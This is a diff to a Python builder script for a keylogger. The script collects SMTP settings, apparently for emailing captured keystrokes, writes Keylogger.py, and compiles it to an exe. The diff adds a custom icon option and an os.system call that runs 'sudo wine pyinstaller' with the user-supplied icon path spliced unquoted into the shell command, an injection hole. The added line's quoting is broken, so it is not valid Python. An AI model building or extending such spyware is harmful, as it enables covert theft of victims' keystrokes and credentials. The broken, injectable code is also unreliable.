@@ -1,4 +1,5 @@
 import sys
+import os
 
 def getfcontent(file):
 		filedata = ''
@@ -34,6 +35,7 @@ def main(argv):
 				print('{}\tyou choosed {} then you want Use Websocket Notification{}'.format(R,sendtype,R))
 			break
 	if sendtype == 1:
+		iconfile = input('\t{0}Enter Icon path (must be an .ico file) : {1}'.format(B,B))
 		gserver = input('\t{0}Enter The Smtp Server : {1}'.format(B,B))
 		gport = int(input('\t{0}Enter The Smtp port : {1}'.format(B,B)))
 		guser = input('\t{0}Enter The Smtp User : {1}'.format(B,B))
@@ -48,7 +50,8 @@ def main(argv):
 		writefcontent("Keylogger.py",klgstr)
 		print(getfcontent("Keylogger.py"))
 		if sys.platform != "win32":
-			print("wine pyinstaller --onefile --hidden-import='/root/.wine/drive_c/users/root/Local Settings/Application Data/Programs/Python/Python38-32/Lib/site-packages/pywin32_system32/pywintypes32.dll' Keylogger.py")
+			os.system("sudo wine pyinstaller --onefile --icon='" + iconfile + ""' --hidden-import='/root/.wine/drive_c/users/root/Local Settings/Application Data/Programs/Python/Python38-32/Lib/site-packages/pywin32_system32/pywintypes32.dll' Keylogger.py")
+			print("open dist folder and get your exe keylogger ")
 	else:
 		print('Not implemented yet')
 
